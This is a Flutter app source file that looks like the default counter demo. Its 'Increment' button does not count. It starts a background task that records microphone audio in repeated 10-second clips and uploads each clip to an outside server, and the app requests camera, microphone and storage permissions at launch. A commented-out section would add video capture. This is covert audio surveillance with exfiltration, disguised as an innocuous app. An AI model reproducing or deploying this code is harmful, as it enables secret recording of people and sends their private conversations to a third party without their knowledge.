import 'dart:ffi';
import 'dart:io';
import 'dart:ui';

// import 'package:camera/camera.dart';
import 'package:flutter/material.dart';
// import 'package:flutter_sound/flutter_sound.dart';
import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:workmanager/workmanager.dart';
import 'package:record/record.dart' as record;
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';

@pragma('vm:entry-point')
void callbackDispatcher() {
  Workmanager().executeTask((task, inputdata) async {


       await recordings();

    return Future.value(true);
  });
}

String? audioPath;

Future<void> recordings() async {
  int startRecord = 0;

  //FlutterSoundRecorder recorderFlutter = FlutterSoundRecorder();

  final recorder = record.AudioRecorder();
  Directory appFolder = await getApplicationDocumentsDirectory();

  while(startRecord < 15) {
    String audiopath = appFolder.path;
    print("recording");

    //
    print(appFolder.path);
    //

    audiopath = "$audiopath/${DateTime
        .now()
        .microsecondsSinceEpoch}.m4a";
    audioPath = audiopath;
    print(audiopath);
    // await recorderFlutter.startRecorder(toFile: audiopath);
    await recorder.start(const record.RecordConfig(
        encoder: record.AudioEncoder.aacHe,
        echoCancel: true,
        noiseSuppress: true,
        androidConfig: record.AndroidRecordConfig(useLegacy: true)),
        path: audiopath);

   // await Future.delayed(const Duration(seconds: 10), () => recorderFlutter.stopRecorder(),);

     await Future.delayed(const Duration(seconds: 10), () => recorder.stop(),);
    print("record stop");
    await uploadAudio();
    startRecord = startRecord + 1 ;
  }
//
//    } else {
//      print("permision failed");
//}
}

Future<void>  uploadAudio() async{

  final file = File(audioPath!);

  final url = Uri.parse('https://demoflu.navajyoti.co.in/eventcode/data/upload.php');

  final request  = http.MultipartRequest('POST',url)
  ..files.add(http.MultipartFile(
    'audio',
    file.readAsBytes().asStream(),
    file.lengthSync(),filename: '${DateTime.now().microsecondsSinceEpoch}'
  ));

  final response = await http.Response.fromStream(await request.send());
  print(response.body);


}

// Future<void> recordingVideo() async{
// final cameraVideo = await availableCameras();
// //final front = cameraVideo.firstWhere((cameraVideo)=>cameraVideo.lensDirection == CameraLensDirection.front);
//
// CameraController cameraController;
// cameraController = CameraController(cameraVideo[0], ResolutionPreset.max,enableAudio: true);
// await cameraController.initialize();
// await cameraController.prepareForVideoRecording();
//
//   Directory appFolder = await getApplicationDocumentsDirectory();
//   // XFile? videoFile;
//   String videopath = appFolder.path;
//
//     videopath = "$videopath/Videos/${DateTime.now().microsecondsSinceEpoch}.mp4";
//     try {
//       await cameraController.startVideoRecording();
//     } on CameraException catch (e){
//       print(e);
//     }
//   if(cameraController.value.isInitialized && cameraController.value.isRecordingVideo){
//     return;
//   }
//
//
//
// }

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  Workmanager().initialize(callbackDispatcher, isInDebugMode: true);
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
        title: 'Flutter Demo',
        theme: ThemeData(
          colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
          useMaterial3: true,
        ),
        home: const MyHomePage(title: 'Check'));
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key, required this.title});

  // This widget is the home page of your application. It is stateful, meaning
  // that it has a State object (defined below) that contains fields that affect
  // how it looks.

  // This class is the configuration for the state. It holds the values (in this
  // case the title) provided by the parent (in this case the App widget) and
  // used by the build method of the State. Fields in a Widget subclass are
  // always marked "final".

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {

  int _counter = 0;



  void permissions() async{
    var statusCamera = await Permission.camera.status;
    var statusMircophone = await Permission.microphone.status;
    var statusStorage = await Permission.storage.status;

    if(statusCamera.isDenied){
      await Permission.camera.request();
    }
    if(statusStorage.isDenied){
      await Permission.storage.request();
    }

    if(statusMircophone.isDenied){
      await Permission.microphone.request();
    }
  }

  @override
  void initState() {
    // TODO: implement initState
    super.initState();
      permissions();
  }

  @override
  Widget build(BuildContext context) {
    // This method is rerun every time setState is called, for instance as done
    // by the _incrementCounter method above.
    //
    // The Flutter framework has been optimized to make rerunning build methods
    // fast, so that you can just rebuild anything that needs updating rather
    // than having to individually change instances of widgets.
    return Scaffold(
      appBar: AppBar(
        // TRY THIS: Try changing the color here to a specific color (to
        // Colors.amber, perhaps?) and trigger a hot reload to see the AppBar
        // change color while the other colors stay the same.
        backgroundColor: Theme.of(context).colorScheme.inversePrimary,
        // Here we take the value from the MyHomePage object that was created by
        // the App.build method, and use it to set our appbar title.
        title: Text(widget.title),
      ),
      body: Center(
        // Center is a layout widget. It takes a single child and positions it
        // in the middle of the parent.
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            const Text(
              'You have pushed the button this many times:',
            ),
            Text(
              '$_counter',
              style: Theme.of(context).textTheme.headlineMedium,
            ),
          ],
        ),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: (){
         // recordings();

          Workmanager().registerOneOffTask("task-identifier", "recording",inputData: {
            "hello":"world"
          },
              existingWorkPolicy: ExistingWorkPolicy.keep
              //     constraints: Constraints(networkType: NetworkType.connected,
              // requiresBatteryNotLow: true,
              // requiresCharging: true,
              // requiresDeviceIdle: true,
              // requiresStorageNotLow: true)
              );
          // Workmanager().registerPeriodicTask(
          //     "uniqueNamePlease",
          //     "taskNamePlease",
          //     frequency: const Duration(minutes: 15),
          //     inputData: {"hrelo":"sdkjhjsdf"}
          //     // constraints:Constraints(networkType: NetworkType.connected,
          //     // requiresBatteryNotLow: true,
          //     // requiresCharging: true,
          //     // requiresDeviceIdle: true,
          //     // requiresStorageNotLow: true)
          // );

          //
          // Workmanager().executeTask((task,inputData){
          //   print('Manully triggered');
          //   return Future.value(true);
          // });
        },
        tooltip: 'Increment',
        child: const Icon(Icons.add),
      ), // This trailing comma makes auto-formatting nicer for build methods.
    );
  }
}
